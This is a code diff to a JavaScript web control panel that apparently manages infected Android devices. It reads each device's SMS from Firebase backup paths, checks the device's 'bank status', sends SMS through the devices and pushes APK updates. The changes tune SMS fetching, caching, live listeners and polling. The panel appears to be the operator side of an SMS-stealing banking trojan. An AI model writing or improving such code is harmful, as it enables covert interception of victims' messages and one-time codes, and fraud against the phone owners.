@@ -1929,6 +1929,58 @@ function fetchAllData(force){
   });
 }
 function refreshData(){toast('Refreshing...',true);fetchAllData(true);}
+function closeNyaMenu(){
+  var m=document.getElementById('nyaMenuDrop');
+  if(m)m.classList.remove('open');
+}
+function toggleNyaMenu(ev){
+  if(ev){ev.stopPropagation();}
+  var m=document.getElementById('nyaMenuDrop');
+  if(!m)return;
+  var open=m.classList.toggle('open');
+  if(open){
+    setTimeout(function(){
+      document.addEventListener('click',function handler(e){
+        if(!e.target.closest('.nya-menu-wrap'))closeNyaMenu();
+        document.removeEventListener('click',handler);
+      });
+    },0);
+  }
+}
+function nyaPromptPanelServer(){
+  if(window.RebelAndroid&&typeof RebelAndroid.promptPanelServer==='function'){
+    RebelAndroid.promptPanelServer();return;
+  }
+  var cur=(window.PANEL_SERVER_URL||'').replace(/\/$/,'');
+  try{var s=localStorage.getItem('nya_panel_server');if(s&&!cur)cur=s;}catch(e){}
+  var u=prompt('Panel Server URL (nya.php folder):',cur||'https://');
+  if(u==null)return;
+  u=String(u).trim().replace(/\/$/,'');
+  if(!u)return;
+  window.PANEL_SERVER_URL=u;
+  try{localStorage.setItem('nya_panel_server',u);}catch(e){}
+  toast('Server saved',true);
+}
+function nyaCheckOtaUpdate(){
+  if(window.RebelAndroid&&typeof RebelAndroid.checkForUpdate==='function'){
+    RebelAndroid.checkForUpdate();return;
+  }
+  toast('OTA sirf APK me available hai',false);
+}
+function nyaReloadPanel(){
+  if(window.RebelAndroid&&typeof RebelAndroid.reloadPanel==='function'){
+    RebelAndroid.reloadPanel();return;
+  }
+  location.reload();
+}
+function nyaMenuAction(action){
+  closeNyaMenu();
+  if(action==='server')nyaPromptPanelServer();
+  else if(action==='firebase')openFbSheet();
+  else if(action==='autotoken')openAutoTokenSheet();
+  else if(action==='ota')nyaCheckOtaUpdate();
+  else if(action==='reload')nyaReloadPanel();
+}
 
 function scanDeviceBankStatus(d){
   if(deviceBankCache[d.id]!==undefined)return Promise.resolve(deviceBankCache[d.id]);
@@ -2293,7 +2345,7 @@ function closeDeviceDetail(){
     }catch(e){}
     delete activeListeners._devLive;
   }
-  clearListeners();
+  clearSmsListeners();
   showPage('home');
 }
 function nyaHandleBack(){
@@ -2388,7 +2440,8 @@ function selectDevice(id){
     var smsEl=document.getElementById('devListDeviceSms');
     if(smsEl)smsEl.innerHTML='<div class="empty">Loading SMS…</div>';
   }
-  loadSmsForDevice(!wasSelected);
+  var hasCache=!!(cached&&cached.list&&cached.list.length);
+  loadSmsForDevice(!hasCache&&!wasSelected);
   scrollActiveListTop();
 }
 function renderSmsModal(){
@@ -2535,10 +2588,12 @@ function showSmsForSelectedDevice(){
   window_sms=window_allSms.slice(0,80);
   renderSmsModal();
 }
-function clearListeners(){
+function clearSmsListeners(keepKey){
   Object.keys(activeListeners).forEach(function(k){
     if(k==='_devLive')return;
+    if(keepKey&&k===keepKey)return;
     var L=activeListeners[k];
+    if(!L)return;
     if(L.loadTimer)clearTimeout(L.loadTimer);
     if(L.timer)clearInterval(L.timer);
     if(L.timers){L.timers.forEach(function(t){clearInterval(t);});}
@@ -2552,7 +2607,16 @@ function clearListeners(){
       }catch(e){}
     });}
     else if(L.db&&L.ref&&L.h){try{L.ref.off('value',L.h);}catch(e){}}
+    delete activeListeners[k];
   });
+}
+function clearListeners(){
+  if(activeListeners._devLive){
+    try{
+      if(activeListeners._devLive.ref&&activeListeners._devLive.h)activeListeners._devLive.ref.off('value',activeListeners._devLive.h);
+    }catch(e){}
+  }
+  clearSmsListeners();
   activeListeners={};
 }
 function attachApkSmsLiveListener(inst,d,devId,seq,listeners,applyFn){
@@ -2582,7 +2646,7 @@ function attachApkSmsLiveListener(inst,d,devId,seq,listeners,applyFn){
 }
 function attachSmsLiveListeners(inst,d,devId,seq,listeners,applyFn){
   if(!inst||!inst.db||typeof applyFn!=='function')return;
-  var paths=uniqPaths(getPrioritySmsPaths(d,inst).concat(['messages/'+d.rawId,'user_sms/'+d.rawId,'sms_backup/'+d.rawId])).slice(0,6);
+  var paths=uniqPaths(getPrioritySmsPaths(d,inst).concat(['messages/'+d.rawId,'user_sms/'+d.rawId,'sms_backup/'+d.rawId])).slice(0,3);
   paths.forEach(function(path){
     if(!path)return;
     try{
@@ -2723,9 +2787,16 @@ function fetchSmsPathsParallel(inst,paths){
 }
 function fetchSmsFast(inst,d){
   if(!inst||!d)return Promise.resolve([]);
+  if(shouldUseApkSmsPath(inst,d)){
+    var apkPath=getApkSmsPath(d);
+    return fetchSmsPathsParallel(inst,[apkPath]).then(function(first){
+      if(first.length)return first;
+      return fetchSmsPathsParallel(inst,['user_sms/'+d.rawId,'sms_backup/'+d.rawId]);
+    });
+  }
   var paths=uniqPaths(getPrioritySmsPaths(d,inst).concat(buildUniversalSmsPaths(d,inst).slice(0,6))).slice(0,12);
   if(!paths.length)paths=['messages/'+d.rawId];
-  var wave1=paths.slice(0,shouldUseApkSmsPath(inst,d)?2:4);
+  var wave1=paths.slice(0,4);
   var wave2=paths.slice(wave1.length);
   return fetchSmsPathsParallel(inst,wave1).then(function(first){
     if(!wave2.length)return first;
@@ -2796,6 +2867,11 @@ function loadSmsForDevice(force){
     renderSms();
   }
 
+  var cacheFresh=cached&&cached.at&&(Date.now()-cached.at<90000);
+  if(!force&&cacheFresh&&activeListeners[devId]&&activeListeners[devId].devId===devId){
+    return;
+  }
+
   if(!force&&activeListeners[devId]&&activeListeners[devId].devId===devId){
     if(_smsLoading){
       var inst0=getFbInstance(d.fbId);
@@ -2807,7 +2883,7 @@ function loadSmsForDevice(force){
   }
 
   var seq=++_smsLoadSeq;
-  clearListeners();
+  clearSmsListeners();
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase project not found',false);_smsLoading=false;return;}
 
@@ -2817,32 +2893,46 @@ function loadSmsForDevice(force){
     _smsLoading=false;
     if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)setDeviceSms(devId,[]);
     else renderSms();
-  },apkSms?5000:12000);
+  },apkSms?4000:10000);
 
   function applySmsList(list){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
     clearTimeout(loadTimer);
     _smsLoading=false;
-    setDeviceSms(devId,list||[]);
+    if(list&&list.length)setDeviceSms(devId,list);
+    else if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)setDeviceSms(devId,[]);
   }
 
   fetchSmsFast(inst,d).then(applySmsList);
-  fetchSmsFromPathsDirect(inst,d).then(function(full){
-    if(seq!==_smsLoadSeq||selDev!==devId||!full||!full.length)return;
-    applySmsList(full);
-  });
-  fetchSmsViaPhp(inst,d).then(function(fb){
-    if(seq!==_smsLoadSeq||selDev!==devId||!fb||!fb.length)return;
-    applySmsList(fb);
-  });
+
+  setTimeout(function(){
+    if(seq!==_smsLoadSeq||selDev!==devId)return;
+    fetchSmsFromPathsDirect(inst,d).then(function(full){
+      if(seq!==_smsLoadSeq||selDev!==devId||!full||!full.length)return;
+      mergeSmsIntoDevice(devId,full);
+      _smsLoading=false;
+    });
+    fetchSmsViaPhp(inst,d).then(function(fb){
+      if(seq!==_smsLoadSeq||selDev!==devId||!fb||!fb.length)return;
+      mergeSmsIntoDevice(devId,fb);
+      _smsLoading=false;
+    });
+  },apkSms?80:250);
 
   var listeners={refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db,timers:[]};
-  attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);
+  if(apkSms){
+    attachApkSmsLiveListener(inst,d,devId,seq,listeners,applySmsList);
+  }else{
+    attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);
+  }
 
-  var pollMs=inst.db?2000:SMS_POLL_BG_MS;
+  var pollMs=inst.db?3000:SMS_POLL_BG_MS;
   var timer=setInterval(function(){
     if(seq!==_smsLoadSeq||selDev!==devId||_panelPaused)return;
-    fetchSmsFast(inst,d).then(applySmsList);
+    fetchSmsFast(inst,d).then(function(list){
+      if(seq!==_smsLoadSeq||selDev!==devId||!list||!list.length)return;
+      mergeSmsIntoDevice(devId,list);
+    });
   },pollMs);
   listeners.timer=timer;
   listeners.timers=[timer];
@@ -3192,6 +3282,18 @@ function sendSmsInstant(to,msg,simSlot,callback){
     database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
     schema:inst.schema||'rabel',device_node:d.deviceNode||getDeviceProfilePath(d)||'clients',composite_id:d.id
   };
+  var nativeOk=false;
+  if(typeof rebelApiPost==='function'){
+    try{
+      var native=rebelApiPost('rebel_send_sms',phpBody);
+      if(native&&native.ok){
+        nativeOk=true;
+        if(callback)callback(true,{ok:true,message:native.message||'SMS command queued',via:'native',path:native.path});
+        return;
+      }
+    }catch(e){}
+  }
+  if(nativeOk)return;
   sendSmsViaRestSequential(inst,attempts)
     .catch(function(){
       if(inst.db)return sendSmsDirectFirebaseSequential(inst,attempts);
